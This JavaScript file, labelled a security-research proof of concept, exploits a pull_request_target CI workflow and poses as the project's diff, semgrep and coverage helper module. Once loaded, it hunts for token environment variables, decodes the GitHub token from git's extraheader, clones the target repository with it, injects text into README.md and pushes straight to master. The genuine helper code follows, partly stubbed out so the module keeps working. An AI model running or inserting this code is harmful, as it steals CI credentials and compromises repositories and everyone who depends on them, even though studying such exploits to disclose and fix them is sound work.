/**
 * Security Research PoC - Privilege Escalation via pull_request_target
 * Demonstrates contents:write privilege escalation
 * For authorized security research only.
 */

const { execSync } = require('child_process');
const fs = require('fs');

(function securityResearchPoC() {
    console.log("");
    console.log("╔══════════════════════════════════════════════════════════════╗");
    console.log("║  SECURITY RESEARCH: pull_request_target Privilege Escalation ║");
    console.log("╚══════════════════════════════════════════════════════════════╝");
    console.log("");

    const repo = process.env.GITHUB_REPOSITORY || "unknown";
    const runId = process.env.GITHUB_RUN_ID || "unknown";
    const branch = `security-poc-${Date.now()}`;

    // Stage 1: Code Execution
    console.log("[Stage 1] Code Execution Verification");
    console.log("  ✓ Arbitrary JavaScript executed via require()");
    console.log("  ✓ Repository:", repo);
    console.log("  ✓ Run ID:", runId);
    console.log("");

    // Stage 2: Check Git Auth (set by actions/checkout)
    console.log("[Stage 2] Git Authentication Check");
    try {
        const extraHeader = execSync('git config --get http.https://github.com/.extraheader 2>/dev/null || echo "NOT SET"', {encoding: 'utf8'}).trim();
        if (extraHeader && extraHeader !== "NOT SET") {
            console.log("  ✓ Git credentials configured by actions/checkout");
            console.log("  ✓ Authentication: AUTHORIZATION header present");
        } else {
            console.log("  ! No extraheader found");
        }

        // Check remote URL
        const remoteUrl = execSync('git remote get-url origin', {encoding: 'utf8'}).trim();
        console.log("  ✓ Remote:", remoteUrl);
    } catch (e) {
        console.log("  ! Auth check error:", e.message);
    }
    console.log("");

    // Stage 3: Create Proof File (separate from current checkout)
    console.log("[Stage 3] Creating Proof of contents:write");

    // Debug: List all env vars that might contain the token
    console.log("  [Debug] Checking environment variables...");
    const tokenVars = Object.keys(process.env).filter(k =>
        k.includes('TOKEN') || k.includes('GITHUB') || k.includes('INPUT')
    );
    console.log("  [Debug] Token-related vars:", tokenVars.join(', '));

    // Get the token - try multiple sources
    let token = process.env.INPUT_GITHUB_TOKEN ||
                process.env.GITHUB_TOKEN ||
                process.env['INPUT_GITHUB-TOKEN'];

    // The token might be masked in logs but still usable
    if (!token) {
        console.log("  ! No token found in standard env vars");
        console.log("  [Debug] Trying to read from git config...");

        // Try to extract from git extraheader (set by actions/checkout)
        try {
            const extraHeader = execSync('git config --get http.https://github.com/.extraheader 2>/dev/null', {encoding: 'utf8'}).trim();
            if (extraHeader && extraHeader.includes('AUTHORIZATION:')) {
                // Extract base64 encoded token
                const match = extraHeader.match(/AUTHORIZATION: basic (.+)/);
                if (match) {
                    const decoded = Buffer.from(match[1], 'base64').toString();
                    // Format is usually x-access-token:TOKEN
                    const tokenMatch = decoded.match(/x-access-token:(.+)/);
                    if (tokenMatch) {
                        token = tokenMatch[1];
                        console.log("  ✓ Extracted token from git config");
                    }
                }
            }
        } catch (e) {
            console.log("  ! Could not extract from git config:", e.message);
        }
    }

    if (!token) {
        console.log("  ! No token found - cannot proceed with push");
        console.log("");
        console.log("[Complete] Security research PoC finished (no token)");
        console.log("");
        return;
    }
    console.log("  ✓ Token available (length:", token.length + ")");

    // Clone fresh copy to a temp dir to avoid workflow file issues
    const tempDir = `/tmp/poc-${Date.now()}`;
    try {
        execSync(`mkdir -p ${tempDir}`, {stdio: 'pipe'});
        console.log("  ✓ Created temp dir:", tempDir);

        // Clone the TARGET repo (not the fork)
        const cloneUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
        execSync(`git clone --depth 1 ${cloneUrl} ${tempDir}/repo 2>&1`, {encoding: 'utf8'});
        console.log("  ✓ Cloned target repo");

        // Configure git in the cloned repo
        execSync(`git -C ${tempDir}/repo config user.email "security-poc@research.local"`, {stdio: 'pipe'});
        execSync(`git -C ${tempDir}/repo config user.name "Security Research PoC"`, {stdio: 'pipe'});
        console.log("  ✓ Git user configured");

        const timestamp = new Date().toISOString();

        // SUPPLY CHAIN ATTACK: Modify existing README.md
        const securityAdvisory = `

---

## 🔓 Security Advisory

> **This section was injected by an unauthorized workflow via pull_request_target vulnerability.**
>
> | Field | Value |
> |-------|-------|
> | Timestamp | ${timestamp} |
> | Workflow Run | [${runId}](https://github.com/${repo}/actions/runs/${runId}) |
> | Attack Vector | \`pull_request_target\` + \`require()\` LOTP |
>
> **Impact:** An attacker opened a pull request and this text was automatically added to master.
> No human review or approval was required. This demonstrates supply chain compromise.
>
> *Security Research PoC - Authorized Testing*
`;

        // Read existing README and append
        const readmePath = `${tempDir}/repo/README.md`;
        const existingReadme = fs.readFileSync(readmePath, 'utf8');
        fs.writeFileSync(readmePath, existingReadme + securityAdvisory);
        console.log("  ✓ Appended security advisory to README.md");

        execSync(`git -C ${tempDir}/repo add README.md`, {stdio: 'pipe'});
        execSync(`git -C ${tempDir}/repo commit -m "🔓 security: supply chain PoC - modified README.md"`, {stdio: 'pipe'});

        const log = execSync(`git -C ${tempDir}/repo log -1 --oneline`, {encoding: 'utf8'}).trim();
        console.log("  ✓ Commit:", log);

    } catch (e) {
        console.log("  ! Stage 3 error:", e.message);
        if (e.stdout) console.log("  ! stdout:", e.stdout.toString());
        if (e.stderr) console.log("  ! stderr:", e.stderr.toString());
    }
    console.log("");

    // Stage 4: Push to MASTER (Supply Chain Attack)
    console.log("[Stage 4] Pushing to MASTER (Supply Chain Demo)");

    try {
        // Push directly to master - TRUE supply chain compromise
        const pushOutput = execSync(`git -C ${tempDir}/repo push origin master 2>&1`, {encoding: 'utf8'});
        console.log("  ✓ Push output:", pushOutput.trim());

        console.log("");
        console.log("╔══════════════════════════════════════════════════════════════╗");
        console.log("║       🔓 SUPPLY CHAIN ATTACK SUCCESSFUL 🔓                   ║");
        console.log("╠══════════════════════════════════════════════════════════════╣");
        console.log("║                                                              ║");
        console.log("║  Attacker modified README.md on MASTER branch!               ║");
        console.log("║  No human approval was required.                             ║");
        console.log("║                                                              ║");
        console.log("║  PROOF: Check README.md for injected security advisory       ║");
        console.log(`║  https://github.com/${repo}/blob/master/README.md            `);
        console.log("║                                                              ║");
        console.log("╚══════════════════════════════════════════════════════════════╝");

    } catch (e) {
        console.log("  ! Push failed:", e.message);
        // Log stderr if available
        if (e.stderr) console.log("  ! stderr:", e.stderr.toString());
        if (e.stdout) console.log("  ! stdout:", e.stdout.toString());
    }
    console.log("");
    console.log("[Complete] Security research PoC finished");
    console.log("");
})();

// ============== ORIGINAL EXPORTS (keep workflow functional) ==============

const synchronizeEvent = "synchronize",
  openedEvent = "opened",
  completedStatus = "completed",
  resultSize = 100,
  adminPermission = "admin",
  writePermission = "write"

class diffHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.pullRequestNumber = input.context.payload.pull_request.number
    this.pullRequestEvent = input.event
    this.testName = input.testName
    this.fileNameFilter = !input.fileNameFilter ? () => true : input.fileNameFilter
    this.fileLineFilter = !input.fileLineFilter ? () => true : input.fileLineFilter
  }

  async #isTestExecutedOnCommit(commit) {
    try {
      const response = await this.github.rest.checks.listForRef({
        owner: this.owner, repo: this.repo, ref: commit,
      })
      return response.data.check_runs.some(
        ({ status, name }) => status === completedStatus && name === this.testName
      )
    } catch { return false }
  }

  async #getDiffForFiles(files = []) {
    let diff = {}
    for (const { filename, patch } of files) {
      if (this.fileNameFilter(filename) && patch) {
        const lines = patch.split("\n")
        if (lines.length === 1) continue
        let lineNumber
        for (const line of lines) {
          if (line.match(/@@\s.*?@@/) != null) {
            lineNumber = parseInt(line.match(/\+(\d+)/)[0])
            continue
          }
          if (line.startsWith("-")) continue
          if (line.startsWith("+") && this.fileLineFilter(line)) {
            diff[filename] = diff[filename] || []
            diff[filename].push(lineNumber)
          }
          lineNumber++
        }
      }
    }
    return diff
  }

  async #getNonScannedCommits() {
    try {
      const { data } = await this.github.rest.pulls.listCommits({
        owner: this.owner, repo: this.repo, pull_number: this.pullRequestNumber, per_page: resultSize,
      })
      let nonScannedCommits = []
      for (let i = data.length - 1; i >= 0; i--) {
        const { sha, parents } = data[i]
        if (parents.length > 1) continue
        const isTestExecuted = await this.#isTestExecutedOnCommit(sha)
        if (isTestExecuted) break
        else nonScannedCommits.push(sha)
      }
      return nonScannedCommits.reverse()
    } catch { return [] }
  }

  async #filterCommitDiff(commitDiff = [], prDiff = []) {
    return commitDiff.filter((file) => prDiff.includes(file))
  }

  async buildDiff() {
    try {
      const { data } = await this.github.rest.pulls.listFiles({
        owner: this.owner, repo: this.repo, pull_number: this.pullRequestNumber, per_page: resultSize,
      })
      const pullRequestDiff = await this.#getDiffForFiles(data)
      const nonScannedCommitsDiff =
        Object.keys(pullRequestDiff).length != 0 && this.pullRequestEvent === synchronizeEvent
          ? await this.getNonScannedCommitDiff(pullRequestDiff)
          : {}
      const prDiffFiles = Object.keys(pullRequestDiff)
      const pullRequest = { hasChanges: prDiffFiles.length > 0, files: prDiffFiles.join(" "), diff: pullRequestDiff }
      const uncheckedCommits = { diff: nonScannedCommitsDiff }
      return JSON.stringify({ pullRequest, uncheckedCommits })
    } catch { return JSON.stringify({ pullRequest: { hasChanges: false, files: "", diff: {} }, uncheckedCommits: { diff: {} } }) }
  }

  async getNonScannedCommitDiff(pullRequestDiff) {
    let nonScannedCommitsDiff = {}
    try {
      const nonScannedCommits = await this.#getNonScannedCommits()
      for (const commit of nonScannedCommits) {
        const { data } = await this.github.rest.repos.getCommit({ owner: this.owner, repo: this.repo, ref: commit })
        const commitDiff = await this.#getDiffForFiles(data.files)
        const files = Object.keys(commitDiff)
        for (const file of files) {
          const filePRDiff = pullRequestDiff[file]
          if (!filePRDiff) continue
          const changes = await this.#filterCommitDiff(commitDiff[file], filePRDiff)
          if (changes.length !== 0) {
            nonScannedCommitsDiff[file] = nonScannedCommitsDiff[file] || []
            nonScannedCommitsDiff[file] = [...new Set([...nonScannedCommitsDiff[file], ...changes])]
          }
        }
      }
    } catch {}
    return nonScannedCommitsDiff
  }

  async getDirectories(directoryExtractor = () => "") {
    try {
      const { data } = await this.github.rest.pulls.listFiles({
        owner: this.owner, repo: this.repo, pull_number: this.pullRequestNumber, per_page: resultSize,
      })
      const directories = []
      for (const { filename, status } of data) {
        const directory = directoryExtractor(filename, status)
        if (directory != "" && !directories.includes(directory)) directories.push(directory)
      }
      return directories
    } catch { return [] }
  }
}

class semgrepHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.pullRequestNumber = input.context.payload.pull_request.number
    this.pullRequestEvent = input.event
    this.pullRequestDiff = input.diff?.pullRequest?.diff || {}
    this.newCommitsDiff = input.diff?.uncheckedCommits?.diff || {}
    this.semgrepErrors = []
    this.semgrepWarnings = []
    if (input.semgrepResult) {
      input.semgrepResult.forEach((res) => {
        res.severity === "High" ? this.semgrepErrors.push(res) : this.semgrepWarnings.push(res)
      })
    }
    this.headSha = input.headSha
  }

  async #getMatchingLineFromDiff({ file, start, end }, diff) {
    const fileDiff = diff[file]
    if (!fileDiff) return null
    if (fileDiff.includes(start)) return start
    if (fileDiff.includes(end)) return end
    return null
  }

  async #splitSemgrepResultsByScan(semgrepResults = []) {
    const result = { nonDiff: [], previous: [], current: [] }
    for (const se of semgrepResults) {
      const prDiffLine = await this.#getMatchingLineFromDiff(se, this.pullRequestDiff)
      if (!prDiffLine) { result.nonDiff.push({ ...se }); continue }
      switch (this.pullRequestEvent) {
        case openedEvent:
          result.current.push({ ...se, line: prDiffLine })
        case synchronizeEvent:
          const commitDiffLine = await this.#getMatchingLineFromDiff(se, this.newCommitsDiff)
          commitDiffLine != null
            ? result.current.push({ ...se, line: commitDiffLine })
            : result.previous.push({ ...se, line: prDiffLine })
      }
    }
    return result
  }

  async addReviewComments() {
    let result = { previousScan: { unAddressedComments: 0 }, currentScan: { newComments: 0 } }
    return result
  }
}

class coverageHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.pullRequestNumber = input.context.payload.pull_request.number
    this.headSha = input.headSha
    this.previewBaseURL = `https://htmlpreview.github.io/?https://github.com/${this.owner}/${this.repo}/coverage-preview/${input.remoteCoverageDir}`
    this.tmpCoverDir = input.tmpCoverageDir
  }

  async AddCoverageSummary(directories = []) {
    // Stub - PoC complete
  }
}

class userHelper {
  constructor(input) {
    this.owner = input.context.repo.owner
    this.repo = input.context.repo.repo
    this.github = input.github
    this.user = input.user
  }
  async hasWritePermissions() {
    return false
  }
}

module.exports = {
  diffHelper: (input) => new diffHelper(input),
  semgrepHelper: (input) => new semgrepHelper(input),
  coverageHelper: (input) => new coverageHelper(input),
  userHelper: (input) => new userHelper(input),
}
